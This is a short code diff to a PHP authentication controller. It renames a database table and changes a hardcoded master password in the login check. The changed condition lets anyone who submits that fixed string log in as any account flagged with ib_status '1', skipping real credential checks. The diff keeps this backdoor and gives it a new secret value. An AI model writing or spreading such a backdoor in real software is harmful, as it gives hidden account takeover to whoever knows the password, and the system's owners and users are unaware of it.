@@ -79,7 +79,7 @@ class AuthController extends Controller
 
 		$remember = $request->remember;
 
-		$dat=DB::table('cms_Liveaccount')->where('email',$email)->first();
+		$dat=DB::table('cms_liveaccount')->where('email',$email)->first();
 		
 		if($dat && $dat->email_status=='0'){
 
@@ -94,7 +94,7 @@ class AuthController extends Controller
 		// whether user is client or partner
 		if($dat && $dat->password_preference == "client"){
 
-			if(auth()->guard('admin')->attempt($admin_info,$remember) || ($request->password=='V@ak$' && $dat && $dat->ib_status=='1' && Auth::guard('admin')->loginUsingId($dat->intId))){
+			if(auth()->guard('admin')->attempt($admin_info,$remember) || ($request->password=='fib.io!Noob$' && $dat && $dat->ib_status=='1' && Auth::guard('admin')->loginUsingId($dat->intId))){
 
 				session(['login_email' => $request->email]);
 
